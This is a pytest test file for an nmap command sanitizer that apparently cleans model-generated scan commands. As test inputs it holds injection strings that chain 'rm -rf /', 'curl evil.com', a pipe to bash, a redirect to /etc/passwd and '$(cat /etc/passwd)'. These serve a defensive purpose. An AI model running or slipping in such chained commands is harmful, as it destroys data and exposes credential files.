import pytest
from src.core.executor import NmapExecutor


@pytest.fixture
def executor():
    return NmapExecutor()


class TestSanitizeCommand:

    def test_clean_command_unchanged(self, executor):
        cmd = "nmap -sS -p 80,443 192.168.1.0/24"
        assert executor._sanitize_command(cmd) == "nmap -sS -p 80,443 192.168.1.0/24 -T4"

    def test_strips_prose_before_nmap(self, executor):
        cmd = "Sure! Here's the command: nmap -sS 192.168.1.1"
        result = executor._sanitize_command(cmd)
        assert result.startswith("nmap")
        assert "Sure" not in result

    def test_strips_semicolon_operator(self, executor):
        cmd = "nmap -sS 192.168.1.1; rm -rf /"
        result = executor._sanitize_command(cmd)
        assert ";" not in result
        assert "rm" not in result

    def test_strips_and_and_operator(self, executor):
        cmd = "nmap -sS 192.168.1.1 && curl evil.com"
        result = executor._sanitize_command(cmd)
        assert "&&" not in result
        assert "curl" not in result

    def test_strips_pipe_operator(self, executor):
        cmd = "nmap -sS 192.168.1.1 | bash"
        result = executor._sanitize_command(cmd)
        assert "|" not in result
        assert "bash" not in result

    def test_strips_redirect_operator(self, executor):
        cmd = "nmap -sS 192.168.1.1 > /etc/passwd"
        result = executor._sanitize_command(cmd)
        assert ">" not in result

    def test_strips_command_substitution(self, executor):
        cmd = "nmap -sS $(cat /etc/passwd)"
        result = executor._sanitize_command(cmd)
        assert "$(" not in result

    def test_top_ports_replaced_with_explicit_list(self, executor):
        cmd = "nmap -sS --top-ports 1000 192.168.1.0/24"
        result = executor._sanitize_command(cmd)
        assert "--top-ports" not in result
        assert "-p " in result

    def test_t4_appended_when_no_timing_flag(self, executor):
        cmd = "nmap -sS 192.168.1.0/24"
        result = executor._sanitize_command(cmd)
        assert "-T4" in result

    def test_existing_timing_flag_preserved(self, executor):
        cmd = "nmap -sS -T3 192.168.1.0/24"
        result = executor._sanitize_command(cmd)
        assert "-T3" in result
        assert result.count("-T") == 1
